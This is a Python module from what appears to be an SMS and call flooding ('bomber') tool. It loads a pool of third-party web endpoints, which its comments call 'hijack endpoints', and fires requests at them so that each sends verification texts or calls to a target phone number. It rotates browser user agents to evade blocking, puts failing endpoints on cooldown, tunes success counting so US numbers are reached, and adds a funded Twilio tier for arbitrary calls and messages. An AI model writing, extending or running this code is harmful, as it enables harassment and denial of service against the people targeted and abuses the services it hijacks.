import os, json, time, random, threading, urllib.request, urllib.parse, base64

HERE = os.path.dirname(os.path.abspath(__file__))
POOL_FILE = os.path.join(HERE, "pool.json")

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36",
]

def _ua():
    return random.choice(UA_LIST)

def _split_phone(phone):
    """Return (cc, local) for a number like +155****4567 -> ('1','5551234567')."""
    p = (phone or "").lstrip("+")
    # NANP: +1 followed by 10 digits -> cc '1' (US/Canada).
    if len(p) == 11 and p.startswith("1"):
        return "1", p[1:]
    if len(p) > 10:
        for n in (4, 3, 2, 1):
            if len(p) - n >= 6:
                return p[:n], p[n:]
    return "1", p

def _render(template, phone):
    cc, local = _split_phone(phone)
    full = (phone or "").lstrip("+")
    s = template
    s = s.replace("{target}", full)
    s = s.replace("{full}", full)
    s = s.replace("{cc}", cc)
    return s

def _http(method, url, data=None, params=None, headers=None, timeout=20):
    h = {
        "User-Agent": _ua(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": url.split("/")[2] + "/",
    }
    if headers:
        h.update(headers)
    if params:
        sep = "&" if "?" in url else "?"
        url = url + sep + urllib.parse.urlencode(params)
    body = None
    if data is not None:
        if isinstance(data, str):
            body = data.encode()
        else:
            body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status

def _accept_set(spec):
    """Return the set of HTTP status codes this endpoint counts as a hit,
    or None to mean 'any non-5xx response' (legacy/unknown behavior)."""
    a = spec.get("accept")
    if a is None:
        return None
    if isinstance(a, int):
        return {a}
    return set(int(x) for x in a)

class Endpoint:
    name = "base"
    def __init__(self):
        self._cool_until = 0.0
        self.ok = 0
        self.fail = 0
    def cooling(self):
        return time.time() < self._cool_until
    def mark_fail(self, secs=60):
        self.fail += 1
        self._cool_until = time.time() + secs
    def mark_ok(self):
        self.ok += 1
    def call(self, to):
        raise NotImplementedError
    def sms(self, to, body=None):
        raise NotImplementedError

class HttpEndpoint(Endpoint):
    def __init__(self, spec):
        Endpoint.__init__(self)
        self.spec = spec
        self.name = spec.get("name") or spec.get("url", "?")[:40]
        self.kind = spec.get("_kind", "sms")
        self.cc = spec.get("_cc", "multi")
        self._accept = _accept_set(spec)
    def fire(self, phone):
        spec = self.spec
        method = (spec.get("method") or "POST").upper()
        url = _render(spec.get("url", ""), phone)
        data = None
        if spec.get("json") is not None:
            d = spec["json"]
            if isinstance(d, dict):
                d = {k: _render(str(v), phone) for k, v in d.items()}
            data = json.dumps(d)
        elif spec.get("data") is not None:
            d = spec["data"]
            data = {} if isinstance(d, dict) else d
            if isinstance(data, dict):
                data = {k: _render(str(v), phone) for k, v in data.items()}
        params = None
        if spec.get("params"):
            params = {k: _render(str(v), phone) for k, v in spec["params"].items()}
        headers = dict(spec.get("headers") or {})
        if spec.get("cookies"):
            headers["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in spec["cookies"].items())
        if data is not None and spec.get("json") is not None:
            headers.setdefault("Content-Type", "application/json")
        try:
            st = _http(method, url, data=data, params=params, headers=headers)
        except urllib.error.HTTPError as e:
            # Some sites 4xx/5xx but still fire the SMS/call.
            st = e.code
        except Exception:
            self.mark_fail()
            return False
        # If the endpoint declares which responses it considers a hit, only
        # count those. (US sites that accept E.164 return 200/202/204; the
        # old "any non-5xx = sent" logic let India/Russia reject-404s pass
        # through as fake successes, so US numbers got nothing.)
        if self._accept is None:
            hit = st < 500
        else:
            hit = st in self._accept
        if hit:
            self.mark_ok()
            return True
        self.mark_fail()
        return False
    def call(self, to):
        return self.fire(to)
    def sms(self, to, body=None):
        # Body can't be controlled on hijack endpoints; they send their own text.
        return self.fire(to)

class TwilioEndpoint(Endpoint):
    """Funded tier: real calls/SMS with arbitrary body. Plug in via env vars."""
    def __init__(self, sid, token, from_number, twiml_url):
        Endpoint.__init__(self)
        self.sid = sid
        self.token = token
        self.from_number = from_number
        self.twiml_url = twiml_url
        self.name = "twilio:" + from_number
        self.kind = "both"
    def _auth(self):
        b = base64.b64encode(("%s:%s" % (self.sid, self.token)).encode()).decode()
        return {"Authorization": "Basic " + b}
    def call(self, to):
        try:
            _http("POST", "https://api.twilio.com/2010-04-01/Accounts/%s/Calls.json" % self.sid,
                  data={"To": to, "From": self.from_number, "Url": self.twiml_url},
                  headers=self._auth())
            self.mark_ok()
            return True
        except Exception:
            self.mark_fail()
            return False
    def sms(self, to, body):
        try:
            _http("POST", "https://api.twilio.com/2010-04-01/Accounts/%s/Messages.json" % self.sid,
                  data={"To": to, "From": self.from_number, "Body": (body or "You have a new message.")[:320]},
                  headers=self._auth())
            self.mark_ok()
            return True
        except Exception:
            self.mark_fail()
            return False

_pool_lock = threading.Lock()
_pool = None

def get_pool():
    global _pool
    with _pool_lock:
        if _pool is None:
            pool = []
            try:
                with open(POOL_FILE) as f:
                    for spec in json.load(f):
                        pool.append(HttpEndpoint(spec))
            except Exception as e:
                print("pool load error:", e)
            sid = os.environ.get("TWILIO_SID", "")
            tok = os.environ.get("TWILIO_TOKEN", "")
            twiml = os.environ.get("TWIML_URL", "http://127.0.0.1:8080/twiml")
            if sid and tok:
                for num in os.environ.get("TWILIO_FROMS", "").replace(" ", "").split(","):
                    if num:
                        pool.append(TwilioEndpoint(sid, tok, num, twiml))
            _pool = pool
        return _pool

def pool_stats():
    pool = get_pool()
    sms = [e for e in pool if e.kind in ("sms", "both")]
    call = [e for e in pool if e.kind in ("call", "both")]
    return {"endpoints": len(pool), "sms": len(sms), "call": len(call),
            "ok": sum(e.ok for e in pool), "fail": sum(e.fail for e in pool)}
